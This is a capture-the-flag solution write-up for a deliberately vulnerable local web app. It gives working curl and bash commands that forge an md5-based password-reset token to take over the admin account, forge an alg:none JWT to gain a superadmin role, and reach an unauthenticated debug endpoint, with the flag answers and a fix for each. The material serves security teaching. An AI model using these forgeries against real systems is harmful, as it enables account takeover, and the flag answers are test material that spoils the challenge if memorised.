# 🚩 Sesame — SOLUTION (SPOILERS)

> ⛔⛔⛔ **STOP.** Full answers to all three flags below. Close this if you're still
> solving.
>
> .
>
> .
>
> .
>
> .
>
> .
>
> .

---

## Flag 1 — Predictable password-reset token (`FLAG{pr3d1ct4bl3_r3s3t_t0k3n_md5}`)

Sign in as `alice` / `hunter2`, open the dashboard. Your reset link is shown:

```
/reset?user=alice&token=6384e2b2184bcbf58eccf10ca7a6563c
```

That token is `md5("alice")`:

```bash
printf '%s' alice | md5        # macOS  -> 6384e2b2184bcbf58eccf10ca7a6563c
# or: echo -n alice | md5sum
```

So the scheme is `token = md5(username)`. Forge the admin's and take the account over:

```bash
atok=$(printf '%s' admin | md5 | awk '{print $1}')   # md5("admin")
curl -s -X POST http://localhost:8090/reset \
  --data-urlencode 'user=admin' \
  --data-urlencode "token=$atok" \
  --data-urlencode 'newpw=pwned123' | grep -o 'FLAG{[^}]*}'
```

The reset-success page for the admin account reveals `FLAG{pr3d1ct4bl3_r3s3t_t0k3n_md5}`.
(You could now also log in as `admin` / `pwned123`.)

**Lesson:** reset tokens must be random, single-use, server-side, and unrelated to any
public value. `md5(username)` is forgeable by anyone who knows the username.

## Flag 2 — JWT alg:none forgery (`FLAG{jwt_4lg_n0n3_f0rg3d_sup3r}`)

After login your `session` cookie is a JWT — three base64url parts. Decode the payload:

```bash
# grab the cookie from DevTools, or:
sess=$(curl -s -i -X POST http://localhost:8090/login --data 'user=alice&pw=hunter2' \
  | grep -i '^set-cookie' | sed 's/.*session=\([^;]*\).*/\1/')
echo "$sess" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null; echo
# -> {"user":"alice","role":"user"}
```

`/console` requires `role == superadmin` — a role **no account has**, so you can't get it
by logging in. Forge an unsigned token (the verifier accepts `alg:"none"`):

```bash
b64u(){ printf '%s' "$1" | base64 | tr '+/' '-_' | tr -d '='; }
h=$(b64u '{"alg":"none","typ":"JWT"}')
p=$(b64u '{"user":"alice","role":"superadmin"}')
forged="$h.$p."          # empty signature
curl -s -b "session=$forged" http://localhost:8090/console | grep -o 'FLAG{[^}]*}'
```

→ `FLAG{jwt_4lg_n0n3_f0rg3d_sup3r}`. (jwt.io: set alg to `none`, edit the role claim,
copy the token.)

**Lesson:** never let the token's own header choose whether to verify it. Pin the
expected algorithm server-side and reject `none`; use a vetted JWT library. The strong
HS256 secret here didn't matter — the verifier skipped verification when told to.

## Flag 3 — Leftover debug endpoint (`FLAG{d3bug_3ndp01nt_l3ft_1n_pr0d}`)

No robots.txt. Every page loads `/static/sesame.js` — read it:

```bash
curl -s http://localhost:8090/static/sesame.js
```

Inside, a migration leftover:

```js
// TODO(remove before GA): diagnostics endpoint ...
//   GET /api/diag  -> live build info + session dump (no auth gate yet!)
var DIAG = api.base + '/api/diag';
```

Hit it directly — no auth required:

```bash
curl -s http://localhost:8090/api/diag | grep -o 'FLAG{[^}]*}'
```

→ `FLAG{d3bug_3ndp01nt_l3ft_1n_pr0d}` (in the `recovery_key` field of the JSON dump).

**Lesson:** discovery is part of the job — routes live in served JS, comments, and via
fuzzing, not just in the UI. And diagnostics/debug endpoints must never ship to prod, and
must be authenticated regardless. (Try `ffuf`/`gobuster` against the app too — same find,
the enumeration way.)

---

### Full flag list
1. `FLAG{pr3d1ct4bl3_r3s3t_t0k3n_md5}`  — reset token = md5(username); forge admin's
2. `FLAG{jwt_4lg_n0n3_f0rg3d_sup3r}`    — forge an alg:none JWT with role=superadmin
3. `FLAG{d3bug_3ndp01nt_l3ft_1n_pr0d}`  — find /api/diag by reading the served JS

### The through-line
Authentication is about *proving identity*, and every proof here was forgeable or
skippable: a token derived from a username, a signature the server declined to check, and
an endpoint that asked for no proof at all. Fixes: random server-side tokens, algorithm-
pinned signature verification, and no unauthenticated debug surface.
